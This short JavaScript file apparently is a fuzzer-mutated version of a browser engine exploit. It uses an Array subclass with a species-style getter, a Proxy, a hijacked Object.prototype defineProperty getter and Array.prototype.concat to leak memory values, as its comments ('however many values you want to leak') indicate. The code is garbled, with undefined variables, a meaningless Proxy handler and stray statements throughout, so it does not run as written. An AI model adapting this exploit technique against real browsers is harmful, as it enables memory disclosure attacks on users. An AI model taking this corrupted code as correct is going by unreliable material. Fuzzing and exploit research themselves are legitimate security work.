var o0 = new Proxy([], o518 |= 16384);
var o1 = Object.prototype.defineProperty;

class o2 extends Array {
    static get [+o86(o63,+(o82(o62,5)|0))]() {
        try {
return o3.concat
}catch(e){}
    }; // custom constructor which returns a proxy object
}

var o613 = o612.target.o503;
try {
o12 = 0.1;
}catch(e){}
try {
o340[o6.o17] = 0.1;
}catch(e){}

function o4() {
    try {
for (var name; o5 < 0x100000; ++o5) {
        var o6 = new o30();
    }
}catch(e){}
}

var o851 = (o850 & 0x7) << 2

try {
Object.prototype.__defineGetter__("defineProperty", o7);
}catch(e){}

var o8 = Array.prototype.concat.call(o3);

try {
for (var o5 = 0; o5 < 20; o5++) { // however many values you want to leak
    try {
o9.o10(o8[o5]);
}catch(e){}
}
}catch(e){}